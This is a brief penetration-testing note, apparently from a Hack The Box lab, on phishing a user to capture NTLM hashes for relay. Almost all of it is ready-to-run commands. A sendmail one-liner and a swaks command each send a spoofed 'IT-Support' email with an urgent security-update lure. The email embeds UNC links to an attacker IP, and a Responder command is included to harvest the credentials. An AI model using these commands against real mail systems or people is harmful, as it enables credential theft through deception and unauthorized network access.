
We can send an Phishing Attack if an Mail Service is running in order to potentially perform NTLM Relay.

Internally with sendmail binary.

```
echo -e "From: IT-Support@painters.htb\nTo: matt@painters.htb\nSubject: Urgent: Security Update Required\nContent-Type: text/html\n\n<html><body><img src=\"\\\\10.10.14.121\\share\\logo.png\"><a href=\"\\\\10.10.14.121\\share\\update.pdf\">Update Now</a></body></html>" | sendmail matt@painters.htb
```

Start responder

```
responder -I tun0
```

---

or with swaks remotely

```
swaks --to matt@painters.htb --from "IT-Support@painters.htb" --server 10.10.110.35 --header "Subject: Urgent: Security Update Required" --header "Content-Type: text/html" --body '<html><body><img src="\\10.10.14.121\share\logo.png"><a href="\\10.10.14.121\share\update.pdf">Update Now</a></body></html>'
```
